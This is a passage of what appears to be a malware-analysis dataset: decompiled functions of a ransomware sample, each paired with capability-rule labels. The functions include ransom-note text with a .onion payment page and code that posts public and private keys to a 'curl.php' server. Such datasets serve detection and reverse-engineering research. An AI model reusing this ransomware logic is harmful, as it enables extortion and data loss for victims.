___________________________________r_n5._http:__gdcbghvjyqy7jclk.onion.plus_8e1511be8e330798________________________________r_n_r_nOn_our_page_you_will_see_instructions_on_payment_and_get_the_opportunity_to_decrypt_1_file_for_free._r_n_r_nDANGEROUS__r_nDo_not_try_to_modify_files_or_use_your_own_private_key___this_will_result_in_the_loss_of_your_data_forever__r_n\n                         [0];\n                do {\n                    pcVar9 = L\"{USERID}\";\n                    iVar5 = iVar6;\n                    if (cVar10 != L'\\0') {\n                        do {\n                            if (*pcVar9 == L'\\0') goto code_r0x004041c0;\n                        } while ((*(iVar12 + pcVar9) == *pcVar9) && (pcVar9 = pcVar9 + 1,  *(iVar12 + pcVar9) != 0));\n                        if (*pcVar9 == L'\\0') goto code_r0x004041c0;\n                    }\n                    cVar10 = pcVar8[1];\n                    pcVar8 = pcVar8 + 1;\n                    iVar12 = iVar12 + 2;\n                    if (cVar10 == L'\\0') break;\n                } while( true );\n            }\n        }\n        uStack344 = 0x740068;\n        uStack340 = 0x700074;\n        if ((*0x412ae4 == 0) &&\n           (*0x412ae4 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x400, 0x3000, 4),  *0x412ae4 != 0)) {\n            (*_sym.imp.USER32.dll_wsprintfW)(*0x412ae4, L\"%s%s\", &stack0xfffffea8, iVar5);\n        }\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(in_stack_fffffef4, 0, 0x8000);\n        fcn.00407720();\n    }\n    return;\n}\n",
        "token_count": 4444
    },
    "00404880": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00404880(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    do {\n        if (*(uVar1 + param_1) != '\\0') {\n            return 0;\n        }\n        uVar1 = uVar1 + 1;\n    } while (uVar1 < 10);\n    return 1;\n}\n",
        "token_count": 90
    },
    "004048a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004048a0(void)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint var_44h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t lpAddress;\n    uint var_ch;\n    int32_t pszString;\n    int32_t hObject;\n    \n    (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    iVar2 = fcn.00404550();\n    if (iVar2 != 0) {\n        (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    }\n    hObject = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00402d30, 0, 0, 0);\n    if (hObject != 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(hObject, 5000);\n        if (iVar2 == 0x102) {\n            (*_sym.imp.KERNEL32.dll_TerminateThread)(hObject, 0);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    }\n    fcn.00404640();\n    fcn.004040a0();\n    fcn.00405ef0();\n    var_20h = 0;\n    var_1ch = 0;\n    var_14h = 0;\n    var_24h = 0;\n    fcn.00405ea0(&var_14h, &var_24h, &var_20h, &var_1ch);\n    bVar1 = false;\n    pszString = 0;\n    iVar2 = fcn.00404880();\n    if (iVar2 != 0) {\n        (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    }\n    while (!bVar1) {\n        iVar2 = fcn.00405750(var_20h, var_1ch, &pszString);\n        if (iVar2 == 0) {\n            (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n        }\n        else {\n            bVar1 = true;\n        }\n    }\n    fcn.00405e60();\n    var_18h = 0;\n    var_ch = 0;\n    bVar1 = false;\n    if (pszString != 0) {\n        var_ch = (*_sym.imp.KERNEL32.dll_lstrlenA)(pszString);\n        var_18h = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, var_ch, 0x3000, 4);\n        iVar2 = (*_sym.imp.CRYPT32.dll_CryptStringToBinaryA)(pszString, 0, 1, var_18h, &var_ch, 0, 0);\n        if (iVar2 == 0) {\n            (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n        }\n        bVar1 = true;\n    }\n    fcn.00403ff0();\n    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x412ae8);\n    if (bVar1) {\n        fcn.00403fc0();\n    }\n    else {\n        fcn.00403de0();\n    }\n    (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(0x412ae8);\n    iVar2 = fcn.00403a60();\n    if (iVar2 != 0) {\n        fcn.00404330();\n    }\n    lpAddress = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x200, 0x3000, 4);\n    if (lpAddress != 0) {\n        (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, lpAddress, 0x100);\n        fcn.00403ba0();\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(lpAddress, 0, 0x8000);\n    }\n    if (*0x412ae4 != 0) {\n        (*_sym.imp.SHELL32.dll_ShellExecuteW)(0, L\"open\", *0x412ae4, 0, 0, 5);\n    }\n    fcn.00405fc0();\n    return;\n}\n",
        "token_count": 957
    },
    "00404ba0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00404ba0(char *arg_8h)\n\n{\n    uint *puVar1;\n    char cVar2;\n    char *in_ECX;\n    char *pcVar3;\n    uint in_EDX;\n    char *pcVar4;\n    int32_t iVar5;\n    uint lpString;\n    uint var_8h;\n    uint lpString1;\n    \n    _lpString = str.Address:._0_8_;\n    var_8h._0_1_ = str.Address:[8];\n    if (*arg_8h == '\\0') {\ncode_r0x00404c1a:\n        if (in_ECX != NULL) {\n            lpString._0_1_ = str.Address:._0_8_;\n            if (lpString == '\\0') {\ncode_r0x00404c5f:\n                if (in_ECX != NULL) {\n                    lpString1 = in_EDX;\n                    iVar5 = (*_sym.imp.KERNEL32.dll_lstrlenA)(&lpString);\n                    for (pcVar4 = in_ECX + iVar5; (*pcVar4 < '0' || (pcVar3 = pcVar4,  '9' < *pcVar4));\n                        pcVar4 = pcVar4 + 1) {\n                    }\n                    for (; ((cVar2 = *pcVar3,  '/' < cVar2 && (cVar2 < ':')) || (cVar2 == '.')); pcVar3 = pcVar3 + 1) {\n                    }\n                    *pcVar3 = '\\0';\n                    (*_sym.imp.KERNEL32.dll_lstrcpyA)(lpString1, pcVar4);\n                    return;\n                }\n            }\n            else {\n                cVar2 = *in_ECX;\n                if (cVar2 != '\\0') {\n                    iVar5 = in_ECX - &lpString;\n                    do {\n                        puVar1 = &lpString;\n                        while (cVar2 != '\\0') {\n                            if (*puVar1 == '\\0') goto code_r0x00404c5f;\n                            if (*(iVar5 + puVar1) != *puVar1) break;\n                            puVar1 = puVar1 + 1;\n                            cVar2 = *(iVar5 + puVar1);\n                        }\n                        if (*puVar1 == '\\0') goto code_r0x00404c5f;\n                        cVar2 = in_ECX[1];\n                        in_ECX = in_ECX + 1;\n                        iVar5 = iVar5 + 1;\n                    } while (cVar2 != '\\0');\n                }\n            }\n        }\n    }\n    else {\n        cVar2 = *in_ECX;\n        if (cVar2 != '\\0') {\n            iVar5 = in_ECX - arg_8h;\n            pcVar4 = arg_8h;\njoined_r0x00404bd9:\n            do {\n                if (cVar2 != '\\0') {\n                    if (*pcVar4 == '\\0') goto code_r0x00404c1a;\n                    if (pcVar4[iVar5] == *pcVar4) {\n                        cVar2 = (pcVar4 + 1)[iVar5];\n                        pcVar4 = pcVar4 + 1;\n                        goto joined_r0x00404bd9;\n                    }\n                }\n                if (*pcVar4 == '\\0') goto code_r0x00404c1a;\n                cVar2 = in_ECX[1];\n                in_ECX = in_ECX + 1;\n                iVar5 = iVar5 + 1;\n                pcVar4 = arg_8h;\n            } while (cVar2 != '\\0');\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_lstrcpyA)();\n    return;\n}\n",
        "token_count": 819
    },
    "00404cb0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: lpNumberOfBytesRead\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00404cb0(void)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    char cVar3;\n    uint extraout_EDX;\n    uchar *puVar4;\n    int32_t unaff_EDI;\n    uint *puVar5;\n    uint lpBuffer;\n    uint uStackY40;\n    uint uStackY36;\n    uint *puStackY32;\n    uint uStackY28;\n    uint *puStackY24;\n    uint uStackY20;\n    int32_t lpNumberOfBytesRead;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x404cbd;\n    fcn.004084b0();\n    lpNumberOfBytesRead = unaff_EDI;\n    var_4h = extraout_EDX;\ncode_r0x00404cc6:\n    uStackY20 = 0;\n    puStackY24 = &fcn.00404cb0::lpNumberOfBytesRead;\n    uStackY28 = 0x1000;\n    puStackY32 = &fcn.00404cb0::lpBuffer;\n    uStackY36 = *0x412b10;\n    uStackY40 = 0x404ce4;\n    iVar1 = (*_sym.imp.KERNEL32.dll_ReadFile)();\n    puVar5 = &fcn.00404cb0::lpBuffer;\n    if (lpBuffer == '\\0') {\ncode_r0x00404d35:\n        if ((iVar1 != 0) && (lpNumberOfBytesRead != 0)) {\n            var_8h = 0x404d53;\n            fcn.00404ba0(var_4h);\n        }\n        return;\n    }\n    puVar4 = &stack0xffbef0a0;\n    cVar3 = lpBuffer;\n    do {\n        pcVar2 = \"Can\\'t find server\";\n        if (cVar3 != '\\0') {\n            do {\n                if (*pcVar2 == '\\0') goto code_r0x00404cc6;\n            } while ((puVar4[pcVar2] == *pcVar2) && (pcVar2 = pcVar2 + 1,  puVar4[pcVar2] != '\\0'));\n            if (*pcVar2 == '\\0') goto code_r0x00404cc6;\n        }\n        cVar3 = *(puVar5 + 1);\n        puVar5 = puVar5 + 1;\n        puVar4 = puVar4 + 1;\n        if (cVar3 == '\\0') goto code_r0x00404d35;\n    } while( true );\n}\n",
        "token_count": 632
    },
    "00405050": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00405050(uint param_1, int32_t *param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uchar auVar7 [16];\n    uint var_127h;\n    int32_t var_28h;\n    int32_t *var_24h;\n    int32_t lpAddress;\n    int32_t lpString;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint32_t pcbBinary;\n    uint pszString;\n    uint32_t var_4h;\n    \n    var_24h = param_2;\n    pszString = param_1;\n    iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(param_1);\n    pcVar5 = _sym.imp.KERNEL32.dll_VirtualAlloc;\n    pcbBinary = iVar2 + 1;\n    var_28h = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, iVar2 + 2U, 0x3000, 0x40);\n    if ((var_28h == 0) || (iVar6 = var_28h,  iVar2 + 2U <= pcbBinary)) {\n        iVar6 = 0;\n    }\n    iVar2 = (*_sym.imp.CRYPT32.dll_CryptStringToBinaryA)(pszString, 0, 1, iVar6, &pcbBinary, 0, 0);\n    uVar1 = pcbBinary;\n    if (iVar2 == 0) {\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar3 = 0;\n    }\n    else {\n        auVar7 = ZEXT816(str.aeriedjDshasj._0_8_);\n        _lpString = CONCAT88(_var_14h, str.aeriedjDshasj._0_8_);\n        fcn.00408b30(&var_127h, 0, 0xff);\n        uVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(&lpString);\n        fcn.00405c40(uVar3);\n        fcn.00405cf0(uVar1);\n        _lpString = auVar7 & 0x0;\n        fcn.004033e0(iVar6);\n        if (lpString != 0) {\n            fcn.00404fd0();\n            pcVar5 = swi(3);\n            uVar3 = (*pcVar5)();\n            return uVar3;\n        }\n        pszString = 1;\n        if (var_18h != 0) {\n            var_4h = (*_sym.imp.KERNEL32.dll_lstrlenA)(var_18h);\n            uVar1 = var_4h + 1;\n            lpAddress = (*pcVar5)(0, uVar1, 0x3000, 0x40);\n            if ((lpAddress == 0) || (iVar2 = lpAddress,  uVar1 <= var_4h)) {\n                iVar2 = 0;\n            }\n            iVar4 = (*_sym.imp.CRYPT32.dll_CryptStringToBinaryA)(var_18h, 0, 1, iVar2, &var_4h, 0, 0);\n            iVar6 = *0x412b00;\n            if (((iVar4 != 0) &&\n                (iVar4 = (*pcVar5)(0, var_4h * 2 + 2, 0x3000, 4),  pcVar5 = _sym.imp.KERNEL32.dll_VirtualAlloc, \n                iVar6 = *0x412b00,  iVar4 != 0)) &&\n               (iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0xfde9, 0, iVar2, 0xffffffff, iVar4, var_4h + 1), \n               pcVar5 = _sym.imp.KERNEL32.dll_VirtualAlloc,  iVar6 = iVar4,  iVar2 < 1)) {\n                (*_sym.imp.KERNEL32.dll_GetLastError)();\n                pcVar5 = _sym.imp.KERNEL32.dll_VirtualAlloc;\n                iVar6 = *0x412b00;\n            }\n            *0x412b00 = iVar6;\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(lpAddress, 0, 0x8000);\n        }\n        if (var_14h != 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(var_14h, 0x3000, 4);\n            iVar2 = (*pcVar5)(0, iVar2 + 1);\n            *var_24h = iVar2;\n            if (iVar2 != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyA)(iVar2, var_14h);\n            }\n        }\n        pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n        if (var_18h != 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_18h);\n            (*pcVar5)(uVar3);\n        }\n        uVar3 = pszString;\n        if (var_14h != 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_14h);\n            (*pcVar5)(uVar3);\n            uVar3 = pszString;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_VirtualFree)(var_28h, 0, 0x8000);\n    return uVar3;\n}\n",
        "token_count": 1264
    },
    "00405370": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405370(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t arg_10h;\n    uint arg_14h;\n    int32_t *in_EDX;\n    uint uVar4;\n    uint arg_1ch;\n    uint noname_6;\n    uint in_stack_fffffb10;\n    uint in_stack_fffffb14;\n    char16_t *arg_2ch;\n    uint *arg_30h;\n    uint var_484h;\n    uint var_480h;\n    uint lpString;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uint var_74h;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint var_64h;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint var_54h;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint var_44h;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint var_34h;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    \n    var_10h = in_EDX;\n    fcn.004077f0();\n    var_14h = fcn.00404eb0();\n    iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)();\n    pcVar1 = _sym.imp.KERNEL32.dll_VirtualAlloc;\n    iVar3 = iVar3 * 2;\n    arg_10h = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, iVar3 + 0x401, 0x3000, 0x40);\n    var_18h = arg_10h;\n    var_ch = (*pcVar1)(0, 0x32001, 0x3000, 0x40);\n    pcVar1 = _sym.imp.KERNEL32.dll_lstrcatA;\n    if ((arg_10h == 0) || (iVar3 + 0x401U <= iVar3 + 0x400U)) {\n        arg_10h = 0;\n    }\n    (*_sym.imp.KERNEL32.dll_lstrcatA)(arg_10h, \"data=\");\n    (*pcVar1)(arg_10h, var_8h);\n    lpString = str.Content_Type:_application_x_www_form_urlencoded._0_4_;\n    uStack132 = str.Content_Type:_application_x_www_form_urlencoded._4_4_;\n    uStack128 = str.Content_Type:_application_x_www_form_urlencoded._8_4_;\n    uStack124 = str.Content_Type:_application_x_www_form_urlencoded._12_4_;\n    var_74h = str.Content_Type:_application_x_www_form_urlencoded._16_4_;\n    uStack116 = str.Content_Type:_application_x_www_form_urlencoded._20_4_;\n    uStack112 = str.Content_Type:_application_x_www_form_urlencoded._24_4_;\n    uStack108 = str.Content_Type:_application_x_www_form_urlencoded._28_4_;\n    var_64h = str.Content_Type:_application_x_www_form_urlencoded._32_4_;\n    uStack100 = str.Content_Type:_application_x_www_form_urlencoded._36_4_;\n    uStack96 = str.Content_Type:_application_x_www_form_urlencoded._40_4_;\n    uStack92 = str.Content_Type:_application_x_www_form_urlencoded._44_4_;\n    var_54h = str.Content_Type:_application_x_www_form_urlencoded._48_4_;\n    uStack84 = str.Content_Type:_application_x_www_form_urlencoded._52_4_;\n    uStack80 = str.Content_Type:_application_x_www_form_urlencoded._56_4_;\n    uStack76 = str.Content_Type:_application_x_www_form_urlencoded._60_4_;\n    var_44h = str.Content_Type:_application_x_www_form_urlencoded._64_4_;\n    uStack68 = str.Content_Type:_application_x_www_form_urlencoded._68_4_;\n    uStack64 = str.Content_Type:_application_x_www_form_urlencoded._72_4_;\n    uStack60 = str.Content_Type:_application_x_www_form_urlencoded._76_4_;\n    var_34h = str.Content_Type:_application_x_www_form_urlencoded._80_4_;\n    uStack52 = str.Content_Type:_application_x_www_form_urlencoded._84_4_;\n    uStack48 = str.Content_Type:_application_x_www_form_urlencoded._88_4_;\n    uStack44 = str.Content_Type:_application_x_www_form_urlencoded._92_4_;\n    (*_sym.imp.KERNEL32.dll_lstrlenA)(arg_10h);\n    uVar4 = 0;\n    var_484h = 0;\n    fcn.00408b30(&var_480h, 0, 0x3fc);\n    (*_sym.imp.KERNEL32.dll_lstrcpyW)(&var_484h, L\"curl.php?token=\");\n    fcn.00405270();\n    (*_sym.imp.KERNEL32.dll_lstrlenW)(&lpString);\n    arg_30h = &lpString;\n    arg_2ch = L\"POST\";\n    noname_6 = 0x31fff;\n    iVar3 = arg_10h;\n    arg_1ch = var_ch;\n    arg_14h = (*_sym.imp.KERNEL32.dll_lstrlenA)();\n    uVar2 = var_14h;\n    iVar3 = fcn.00407a00(var_14h, &var_484h, arg_10h, arg_14h, iVar3, arg_1ch, noname_6, in_stack_fffffb10, \n                         in_stack_fffffb14, arg_2ch, arg_30h);\n    if ((iVar3 != 0) && (uVar4 = 1,  arg_8h != 0)) {\n        var_8h = 0;\n        iVar3 = fcn.00405050();\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else if (var_8h != 0) {\n            *var_10h = var_8h;\n        }\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_VirtualFree;\n    (*_sym.imp.KERNEL32.dll_VirtualFree)(uVar2, 0, 0x8000);\n    (*pcVar1)(var_ch, 0, 0x8000);\n    (*pcVar1)(var_18h, 0, 0x8000);\n    if (var_1ch != 0) {\n        (*_sym.imp.WININET.dll_InternetCloseHandle)(var_1ch);\n    }\n    return uVar4;\n}\n",
        "token_count": 1573
    },
    "00405750": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00405750(uint arg_8h, int32_t arg_ch, int32_t *arg_10h)\n\n{\n    char cVar1;\n    code *pcVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint in_ECX;\n    int32_t in_EDX;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    code *pcVar9;\n    char *pcVar10;\n    uint32_t uVar11;\n    uint uStack820;\n    uint uVar12;\n    char16_t *pcStack756;\n    uint uStack752;\n    uint uStack748;\n    uint uStack744;\n    ulong uStack740;\n    uint uStack732;\n    uint32_t uStack728;\n    char *pcStack724;\n    char *pcStack720;\n    char16_t *pcStack716;\n    uint uStack712;\n    uint32_t uStack708;\n    char *pcStack704;\n    uint uStack700;\n    char *pcStack696;\n    uint uStack692;\n    char *pcStack688;\n    char *pcStack684;\n    char *pcStack680;\n    char16_t *pcStack676;\n    char *pcStack644;\n    char *pcStack640;\n    char *pcStack632;\n    int32_t iStack624;\n    uint uStack580;\n    uint uStack576;\n    uint32_t uStack572;\n    uint uStack568;\n    uint uStack564;\n    uint in_stack_fffffddc;\n    int32_t iVar13;\n    int32_t in_stack_fffffde0;\n    uint in_stack_fffffde4;\n    int32_t iVar14;\n    uint in_stack_fffffe0c;\n    uint in_stack_fffffe10;\n    uint in_stack_fffffe14;\n    \n    uStack564 = 0x405794;\n    fcn.004039b0(1, in_ECX, 1, in_stack_fffffddc, in_stack_fffffde0, in_stack_fffffde4, 1, in_ECX, 1, in_ECX, 1, in_ECX\n                 , 1, in_ECX, 1, in_stack_fffffe0c, in_stack_fffffe10, in_stack_fffffe14, 1, in_ECX, 1);\n    uStack564 = 0x40579d;\n    fcn.00406d90();\n    uStack564 = 0x4057a6;\n    iVar4 = fcn.00406ba0();\n    uStack564 = 0x40;\n    uStack568 = 0x3000;\n    uVar8 = (iVar4 + (arg_ch + in_EDX + 8) * 8) * 8;\n    uStack576 = 0;\n    uStack580 = 0x4057c6;\n    uStack572 = uVar8;\n    iVar5 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)();\n    pcVar2 = _sym.imp.CRYPT32.dll_CryptBinaryToStringA;\n    uVar7 = 0;\n    uVar11 = (iVar4 + (arg_ch + in_EDX) * 4) * 8 + 0x30;\n    iVar4 = iVar5;\n    if ((iVar5 != 0) && (uVar11 < uVar8)) {\n        uVar7 = uVar11;\n        iVar4 = uVar11 + iVar5;\n    }\n    iVar13 = arg_ch * 8 + 2;\n    if ((iVar5 == 0) || (uVar11 = uVar7 + iVar13,  uVar8 <= uVar11)) {\n        iVar14 = 0;\n        iVar13 = iVar4;\n    }\n    else {\n        uVar7 = uVar11;\n        iVar13 = iVar4 + iVar13;\n        iVar14 = iVar4;\n    }\n    if ((iVar5 == 0) || (uVar8 <= in_stack_fffffde0 * 8 + 2 + uVar7)) {\n        iVar13 = 0;\n    }\n    pcVar9 = _sym.imp.KERNEL32.dll_VirtualFree;\n    if (iVar14 != 0) {\n        uStack580 = &stack0xfffffde4;\n        (*_sym.imp.CRYPT32.dll_CryptBinaryToStringA)();\n        (*pcVar2)();\n        pcVar2 = _sym.imp.KERNEL32.dll_lstrlenA;\n        iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)();\n        iVar5 = (*pcVar2)();\n        pcStack632 = 0x3000;\n        pcVar10 = iVar4 + iVar5 + 0x42;\n        pcStack640 = NULL;\n        (*_sym.imp.KERNEL32.dll_VirtualAlloc)();\n        iVar4 = (*pcVar2)();\n        if ((in_stack_fffffde0 == 0) || (pcVar3 = iVar4 + 1,  iStack624 = in_stack_fffffde0,  pcVar10 <= iVar4 + 1)) {\n            iStack624 = 0;\n            pcVar3 = pcStack632;\n        }\n        pcStack632 = pcVar3;\n        iVar4 = (*pcVar2)();\n        if ((iVar14 == 0) || (pcVar10 <= pcVar10 + iVar4 + 1)) {\n            pcStack632 = NULL;\n        }\n        uVar11 = 0;\n        iVar4 = (*pcVar2)();\n        if (iVar4 != 0) {\n            pcStack640 = pcStack632;\n            do {\n                cVar1 = *(uVar11 + in_stack_fffffde0);\n                if ((cVar1 != '\\n') && (cVar1 != '\\r')) {\n                    *pcStack640 = cVar1;\n                    pcStack640 = pcStack640 + 1;\n                }\n                uVar11 = uVar11 + 1;\n                uVar7 = (*pcVar2)();\n                iVar13 = iStack624;\n            } while (uVar11 < uVar7);\n        }\n        uVar11 = 0;\n        iVar4 = (*pcVar2)();\n        if (iVar4 != 0) {\n            pcStack644 = pcStack640;\n            do {\n                cVar1 = *(uVar11 + iVar13);\n                if ((cVar1 != '\\n') && (cVar1 != '\\r')) {\n                    *pcStack644 = cVar1;\n                    pcStack644 = pcStack644 + 1;\n                }\n                uVar11 = uVar11 + 1;\n                uVar7 = (*pcVar2)();\n            } while (uVar11 < uVar7);\n        }\n        pcVar9 = _sym.imp.KERNEL32.dll_lstrcatW;\n        (*_sym.imp.KERNEL32.dll_lstrcatW)();\n        pcVar2 = _sym.imp.KERNEL32.dll_lstrlenW;\n        iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n        pcVar10 = pcStack632 + iVar4 * 2;\n        pcStack676 = 0x405999;\n        fcn.004069a0(pcVar10);\n        pcStack676 = L\"&pub_key=\";\n        pcStack684 = 0x4059a1;\n        pcStack680 = pcVar10;\n        (*pcVar9)();\n        pcStack688 = 0x4059a4;\n        pcStack684 = pcVar10;\n        iVar4 = (*pcVar2)();\n        pcStack688 = pcStack632;\n        pcStack696 = pcVar10 + iVar4 * 2;\n        uStack692 = 0x4059b1;\n        uStack692 = (*_sym.imp.KERNEL32.dll_lstrlenA)();\n        uStack700 = 0xffffffff;\n        pcStack704 = pcStack632;\n        uStack708 = 0;\n        uStack712 = 0xfde9;\n        pcStack716 = 0x4059c6;\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n        pcStack716 = L\"&priv_key=\";\n        pcStack724 = 0x4059ce;\n        pcStack720 = pcVar10;\n        (*pcVar9)();\n        uStack728 = 0x4059d5;\n        pcStack724 = pcVar10;\n        iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n        uStack728 = uStack708;\n        uStack740._4_4_ = pcVar10 + iVar4 * 2;\n        uStack732 = 0x4059e2;\n        uStack732 = (*_sym.imp.KERNEL32.dll_lstrlenA)();\n        uStack740._0_4_ = 0xffffffff;\n        uStack744 = uStack712;\n        uStack748 = 0;\n        uStack752 = 0xfde9;\n        pcStack756 = 0x4059f7;\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n        pcStack756 = L\"&version=2.1\";\n        (*pcVar9)(pcVar10);\n        pcVar2 = _sym.imp.KERNEL32.dll_lstrlenW;\n        iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenW)(uStack740._4_4_);\n        uVar12 = 0x40;\n        iVar5 = 0;\n        uStack752 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, iVar4 * 0x10 + 0x12, 0x3000, 0x40);\n        (*pcVar2)(pcStack756);\n        iVar4 = (*pcVar2)(pcVar10);\n        uStack732 = str.aeriedjDshasj._8_4_;\n        uStack740 = str.aeriedjDshasj._0_8_;\n        uStack728._0_3_ = CONCAT12(str.aeriedjDshasj[14], str.aeriedjDshasj._12_2_);\n        uStack728 = uStack728 & 0xff000000 | uStack728;\n        uStack580 = uStack580 & 0xffffff00;\n        fcn.00408b30(&stack0xfffffdbd, 0, 0xff);\n        pcVar2 = _sym.imp.KERNEL32.dll_lstrlenA;\n        uVar6 = (*_sym.imp.KERNEL32.dll_lstrlenA)(&stack0xfffffd1c);\n        fcn.00405c40(uVar6);\n        fcn.00405cf0(iVar4 * 2);\n        pcStack756 = iVar4 * 8;\n        iVar4 = (*_sym.imp.CRYPT32.dll_CryptBinaryToStringA)(uVar12, iVar4 * 2, 0x40000001, iVar5, &stack0xfffffd0c);\n        if (iVar4 == 0) {\n            (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        iVar4 = (*pcVar2)(iVar5);\n        uStack820 = 0x40;\n        (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, iVar4 + 2, 0x3000);\n        (*pcVar2)(iVar5);\n        uVar11 = 0;\n        iVar4 = (*pcVar2)(iVar5);\n        if (iVar4 != 0) {\n            pcVar10 = 0x40;\n            do {\n                cVar1 = *(uVar11 + iVar5);\n                if ((cVar1 != '\\n') && (cVar1 != '\\r')) {\n                    *pcVar10 = cVar1;\n                    pcVar10 = pcVar10 + 1;\n                }\n                uVar11 = uVar11 + 1;\n                uVar7 = (*pcVar2)(iVar5);\n            